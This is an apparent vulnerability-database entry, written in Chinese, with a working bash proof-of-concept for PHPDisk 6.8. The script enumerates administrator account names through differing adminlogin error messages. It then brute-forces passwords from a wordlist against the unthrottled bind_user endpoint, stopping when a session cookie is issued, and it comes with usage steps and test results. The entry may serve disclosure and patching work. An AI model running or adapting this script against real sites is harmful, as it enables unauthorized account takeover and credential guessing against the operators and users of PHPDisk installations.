# PHPDisk 6.8 adminlogin 账号枚举 + bind_user 无频控口令校验双通道

- **code**: phpdisk-6.8-adminlogin-账号枚举-bind_user-无频控口令校验双通道
- **kind**: script
- **category**: auth-bypass
- **component**: PHPDisk 6.8
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.103（example.com，PHPDisk 6.8 build20190325）实测：验证码 EWT5 正确时 username=admin 返回「您不是合法的后台管理员」(5334B)、username=root 返回「该用户名未注册」(5325B)；bind_user 用自注册账号 zzprobe97418/ZzProbe@2026 返回 true|社会化登录成功 并下发 Set-Cookie phpdisk_zcore_v2_info，错误口令返回「用户名或密码不正确」(30B)。连续约 280 次请求未触发任何封禁。
- **path**: pocs/phpdisk-6.8-adminlogin-账号枚举-bind_user-无频控口令校验双通道/phpdisk_enum_brute.sh
- **tags**: phpdisk,auth-bypass,user-enum,brute-force,php
- **created_at**: 2026-10-17T09:36:00.248Z
- **found_by**: vuln-scan

## 描述

PHPDisk 6.8 双通道账号探测：① adminlogin 在验证码正确时可区分「账号存在但 gid≠1」与「用户名未注册」，实现账号存在性枚举；② example.com?action=bind_user 是无验证码、无频率限制、无账号锁定的在线口令校验接口，正确口令返回 true|社会化登录成功 并签发 phpdisk_zcore_v2_info 会话票据，是快速口令爆破的最佳通道。注意 adminlogin 的验证码错误时会返回「您不是合法的后台管理员」兜底提示，会造成枚举假阳性，必须以验证码正确为前提。

## 用法

```
./phpdisk_enum.sh http://TARGET ；先把 formhash 换成目标首页实际值（common.js/注册页可取），wordlist.txt 放字典。适用于 PHPDisk 6.x / Z-Core 高级版。
```

## 正文

```
#!/usr/bin/env bash
# PHPDisk 6.8 adminlogin 账号存在性枚举 + bind_user 口令校验
# 用法: ./phpdisk_enum.sh http://TARGET
BASE="${1:-http://TARGET}"
CK=$(mktemp)

# ---- 1) adminlogin 账号存在性枚举（验证码正确时才有判定价值）----
# 先取 session + 验证码图，人工/OCR 识别出明文 CODE
curl -s -c "$CK" -o /dev/null "$BASE/account.php?action=adminlogin"
curl -s -b "$CK" -c "$CK" -o ./code.png "$BASE/includes/imgcode.inc.php?verycode_type=2"
echo "[*] 请识别 ./code.png 中的 4 位验证码，填入 CODE"
read -p "CODE=" CODE

for u in admin admincp administrator root superadmin webmaster manager; do
  R=$(curl -s -b "$CK" -X POST "$BASE/account.php?action=adminlogin" \
      -d "formhash=HASH&task=adminlogin&username=$u&password=x&verycode=$CODE")
  if   echo "$R" | grep -q '不是合法的后台管理员'; then echo "[+] $u 存在（gid≠1）"
  elif echo "$R" | grep -q '该用户名未注册';       then echo "[-] $u 不存在"
  fi
  # 验证码一次性消耗，每轮需重新取图识别
done

# ---- 2) bind_user 口令校验（无验证码、无频控，最佳爆破通道）----
# 正确 -> "true|社会化登录成功" + Set-Cookie phpdisk_zcore_v2_info
# 错误 -> "用户名或密码不正确"
while read -r PW; do
  R=$(curl -s -X POST "$BASE/example.com?action=bind_user" \
      -d "flid=probe$RANDOM&username=admin&password=$PW")
  [ "$R" != '用户名或密码不正确' ] && { echo "[HIT] admin / $PW => $R"; break; }
  sleep 1.5
done < wordlist.txt

```
